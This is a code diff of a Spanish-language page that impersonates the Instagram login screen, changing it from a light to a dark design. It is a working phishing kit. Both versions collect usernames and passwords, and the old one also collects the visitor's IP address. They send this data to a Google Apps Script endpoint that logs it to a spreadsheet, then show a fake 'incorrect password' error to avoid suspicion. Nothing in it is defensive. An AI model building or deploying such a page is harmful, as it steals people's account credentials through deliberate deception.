@@ -5,76 +5,226 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { width: 350px; background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; display: flex; flex-direction: column; align-items: center; }
-        .logo { margin-bottom: 20px; font-family: 'Grand Hotel', cursive; font-size: 48px; color: #262626; }
-        .input-group { width: 100%; margin-bottom: 6px; }
-        input { width: 100%; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 14px 10px; font-size: 12px; color: #262626; outline: none; }
-        input:focus { border-color: #a8a8a8; }
-        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: #ffffff; font-weight: 600; padding: 10px; margin-top: 10px; cursor: pointer; font-size: 14px; }
-        button:disabled { background-color: #87d8f8; cursor: default; }
-        .error { color: #ed4956; font-size: 12px; margin-top: 10px; display: none; text-align: center; }
-        .loader { display: none; margin-top: 10px; font-size: 12px; color: #8e8e8e; }
-        /* Ocultar el iframe que usaremos para enviar los datos */
-        iframe { display: none; }
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000; /* Fondo Negro */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #f5f5f5;
+        }
+
+        .container {
+            width: 350px;
+            background-color: #262626; /* Gris oscuro para el formulario */
+            border: 1px solid #363636;
+            border-radius: 1px;
+            padding: 10px 40px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            margin-top: 30px;
+            margin-bottom: 20px;
+            width: 175px;
+        }
+
+        .logo img {
+            width: 100%;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #121212; /* Fondo de input muy oscuro */
+            border: 1px solid #363636;
+            border-radius: 3px;
+            padding: 14px 10px;
+            margin: 0;
+            font-size: 12px;
+            color: #f5f5f5;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: #8e8e8e;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+
+        .btn:hover {
+            opacity: 1;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: default;
+        }
+
+        .or {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #a8a8a8;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .or::before, .or::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #363636;
+        }
+
+        .or::before { margin-right: 10px; }
+        .or::after { margin-left: 10px; }
+
+        .error-msg {
+            color: #f5f5f5;
+            font-size: 12px;
+            font-weight: 600;
+            display: none;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 10px;
+            background-color: #3a1d1d; /* Rojo oscuro */
+            padding: 8px;
+            border-radius: 3px;
+            border: 1px solid #8a2be2; /* Opcional: borde sutil */
+        }
+
+        .loading {
+            display: none;
+            margin-top: 10px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .fb-login {
+            color: #a8a8a8;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .forgot {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #a8a8a8;
+            cursor: pointer;
+        }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
+
     <div class="container">
-        <div class="logo">Instagram</div>
-        <div class="error" id="error-msg">El nombre de usuario o la contraseña es incorrecta.</div>
-        
-        <!-- Formulario que apunta al iframe -->
-        <form id="login-form" target="hidden_iframe" action=https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec method="POST">
-            <div class="input-group">
-                <input type="text" name="username" id="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+        <!-- Logo de Instagram -->
+        <div class="logo">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020wY07c.svg" alt="Instagram Logo">
+        </div>
+
+        <!-- Mensaje de error -->
+        <div class="error-msg" id="errorMsg">Contraseña incorrecta. Intenta de nuevo.</div>
+
+        <form id="loginForm" onsubmit="return false;">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
             </div>
-            <div class="input-group">
-                <input type="password" name="password" id="password" placeholder="Contraseña" required>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Contraseña" required>
             </div>
-            <input type="hidden" name="ip" id="ip_field">
-            <button type="submit" id="submit-btn">Iniciar sesión</button>
+            <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
         </form>
+
+        <div class="or">O</div>
         
-        <div class="loader" id="loader">Iniciando sesión...</div>
+        <div class="fb-login">
+            Iniciar sesión con Facebook
+        </div>
         
-        <!-- Iframe oculto para el envío -->
-        <iframe name="hidden_iframe"></iframe>
+        <div class="forgot">
+            ¿Has olvidado la contraseña?
+        </div>
     </div>
 
     <script>
-        // Obtener IP del usuario
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById('ip_field').value = data.ip;
-            })
-            .catch(() => {
-                document.getElementById('ip_field').value = 'No disponible';
-            });
+        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
+        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;
 
-        const form = document.getElementById('login-form');
-        const btn = document.getElementById('submit-btn');
-        const loader = document.getElementById('loader');
-        const errorMsg = document.getElementById('error-msg');
+        const form = document.getElementById('loginForm');
+        const btn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
 
-        form.addEventListener('submit', function() {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // UI Feedback
             btn.disabled = true;
-            loader.style.display = 'block';
+            btn.innerText = '...';
             errorMsg.style.display = 'none';
-        });
 
-        // Escuchar cuando el iframe responde
-        document.querySelector('iframe').onload = function() {
-            // Simulamos un pequeño retraso para realismo
-            setTimeout(() => {
-                loader.style.display = 'none';
+            // Enviar datos a Google Sheets
+            const data = new FormData();
+            data.append('username', username);
+            data.append('password', password);
+
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                body: data
+            })
+            .then(response => {
+                // Simular un pequeño retraso
+                return new Promise(resolve => setTimeout(resolve, 1000));
+            })
+            .then(() => {
+                btn.disabled = false;
+                btn.innerText = 'Iniciar sesión';
+                
+                // Mostrar error para realismo
                 errorMsg.style.display = 'block';
                 errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
+            })
+            .catch(error => {
                 btn.disabled = false;
-            }, 1500);
-        };
+                btn.innerText = 'Iniciar sesión';
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'Error de conexión.';
+            });
+        });
     </script>
 </body>
 </html>
